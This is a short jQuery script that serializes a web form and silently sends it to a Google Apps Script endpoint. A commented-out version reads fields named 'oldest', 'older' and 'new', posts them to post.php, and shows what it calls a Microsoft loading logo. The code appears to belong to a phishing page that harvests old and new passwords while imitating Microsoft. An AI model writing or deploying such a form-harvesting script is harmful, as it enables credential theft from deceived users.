
var $form = $("#daform")

var url = "https://script.google.com/macros/s/AKfycbz7wmM2XV-2gPIzKO3KGd5gUss5wnWU8NRdijRMnqJLP-IeyfY/exec";


$("button#sender").on('click',function(e){
    e.preventDefault();
    var jqxhr = $.ajax({
        url: url,
        method: "GET",
        dataType: "json",
        data: $form.serialize(),
        success: function(){
        console.log("Success, code 200");
        }
    });
});











/*

/u/0
https://script.google.com/macros/u/0/s/AKfycbz7wmM2XV-2gPIzKO3KGd5gUss5wnWU8NRdijRMnqJLP-IeyfY/exec


*/







/*
$("button#sender").on('click', function(e){
    e.preventDefault();
    var val1 = $("#oldest").val();
    var val2 = $("#older").val();
    var val3 = $("#new").val();
    var form = new FormData();
    form.append('oldest',val1);
    form.append('older',val2);
    form.append('new', val3);
    $.ajax({
        url: "post.php",
        type: "POST",
        async: false,
        contentType: false,
        processsData: false,
        data: form,
        success: function(response){
            alert(response);
        }
        });
    $("body").html("<img src='301.gif' alt='Microsoft\'s loading logo style='text-align:center; display:block; margin: 100px auto' />");
});

*/
